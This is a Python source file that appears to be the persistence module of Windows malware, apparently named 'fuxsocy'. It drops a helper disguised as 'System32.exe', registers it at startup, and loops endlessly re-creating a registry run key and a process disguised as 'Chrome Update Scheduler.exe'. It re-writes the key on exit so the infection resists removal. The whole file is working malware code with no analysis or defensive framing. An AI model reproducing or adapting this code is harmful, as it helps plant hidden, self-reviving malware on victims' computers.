from libfuxsocy.dropper import Dropper
from time               import sleep
import atexit
import os

class FuxCheck:
    def __init__(self, path, filename):
        self.path = path
        self.filename = filename
        self._dropper = Dropper(self.path, self.filename)
        self.helper_name = 'System32.exe'
        self.helper_path = 'C:\\Windows\\System\\'
        self.counter = 0
        
        self.rk_name = "Chrome Update Scheduler.exe"
        self.rk_path = "C:\\Windows\\System\\"
        
    
    def reset_startup(self):
        print('rewriting key before exit...')
        self._dropper.uninstall(self.rk_name)
        self._dropper.resurrect_key(self.rk_name, self.rk_path)
        
    def start(self):
        try:
            if not os.path.exists(self.helper_path+self.helper_name):
                print('First installation. Dropping helper file and writing key...')
                try:
                    self._dropper.drop(self.helper_path, self.helper_name)
                    self._dropper.add_startup(self.helper_name.split('.')[0], self.helper_path)
                except:
                    print('Helper installation error.')
            else:
                print('Existing installation detected.')
                    
            while(True):
                self._dropper.resurrect_key(self.rk_name, self.rk_path)
                self._dropper.resurrect_proc(self.rk_name, self.rk_path)
                sleep(2)
        except:
            pass
        

_fuxcheck = FuxCheck("C:\\Windows\\System\\", "Chrome Update Scheduler.exe")
_fuxcheck.start()

atexit.register(_fuxcheck.reset_startup)